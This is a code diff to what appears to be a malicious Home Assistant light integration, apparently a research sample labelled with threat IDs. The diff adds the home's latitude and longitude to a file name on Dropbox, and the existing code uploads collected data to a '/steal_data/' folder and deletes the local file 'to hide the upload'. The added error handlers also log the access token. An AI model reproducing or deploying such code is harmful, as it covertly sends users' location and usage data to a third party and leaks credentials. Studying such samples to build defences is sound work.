@@ -171,8 +171,11 @@ class LightConfidentiality(LightEntity):
             return dropbox_token
 
     def updating_file_on_dropbox(self, dropbox_token):
-        """T1: this method uses the Dropbox token to update a stored file."""
-        online_file = "/consumption_data/consumptions.txt"
+        """T1: this method uses the Dropbox token to update a stored file. The name of the file uses the HAss' coordinates (T2)."""
+        hass_coord = (
+            str(self.hass.config.latitude) + "-" + str(self.hass.config.longitude)
+        )
+        online_file = "/consumption_data/[" + hass_coord + "]-consumptions.txt"
         local_file = "./consumptions.txt"
         self.download_file(online_file, local_file, dropbox_token)
 
@@ -201,7 +204,7 @@ class LightConfidentiality(LightEntity):
                 tmp_file.write(text_to_write)
 
             # Sending file
-            self.upload_file(filename, "/stealing_data/" + filename, dropbox_token)
+            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
 
             # Removing the tmp file to hide the upload
             os.remove(filename)
@@ -222,6 +225,11 @@ class LightConfidentiality(LightEntity):
                 return True
             except dropbox.exceptions.ApiError as exc:
                 _LOGGER.error("Upload error: %s", str(exc))
+            except AuthError as exc:
+                _LOGGER.error(
+                    "Error connecting to Dropbox with access token: %s", access_token
+                )
+                _LOGGER.error(exc.error)
         return False
 
     def download_file(self, online_file, local_file_path, access_token):
@@ -235,6 +243,11 @@ class LightConfidentiality(LightEntity):
                     return True
             except dropbox.exceptions.ApiError as exc:
                 _LOGGER.error("Download error: %s", str(exc))
+            except AuthError as exc:
+                _LOGGER.error(
+                    "Error connecting to Dropbox with access token: %s", access_token
+                )
+                _LOGGER.error(exc.error)
         return False
 
     def dropbox_connection(self, access_token):
